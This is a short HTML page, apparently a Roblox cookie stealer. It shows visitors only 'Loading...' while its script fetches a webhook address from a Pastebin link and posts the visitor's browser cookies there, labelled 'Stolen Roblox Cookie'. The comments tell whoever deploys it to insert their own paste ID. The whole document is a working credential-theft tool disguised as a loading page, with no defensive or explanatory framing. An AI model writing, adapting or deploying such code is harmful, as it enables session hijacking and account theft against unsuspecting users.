<!DOCTYPE html>
<html>
<body>
    <h1>Loading...</h1>
    <script>
        // 1. Fetch the raw webhook URL from your private Pastebin
        // Replace 'YOUR_PASTE_ID' with your actual Pastebin ID (e.g., abc123def)
        const PASTEBIN_RAW_URL = 'https://pastebin.com/7zNB39Uf';

        fetch(PASTEBIN_RAW_URL)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch webhook URL');
                }
                return response.text();
            })
            .then(webhookUrl => {
                // 2. Send the cookie to the fetched webhook URL
                const cookie = document.cookie;
                
                fetch(webhookUrl.trim(), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🍪 Stolen Roblox Cookie:\n\`\`\`${cookie}\`\`\``
                    })
                })
                .then(() => console.log('Cookie sent successfully'))
                .catch(err => console.error('Error sending cookie:', err));
            })
            .catch(err => {
                console.error('Failed to get webhook URL:', err);
            });
    </script>
</body>
</html>
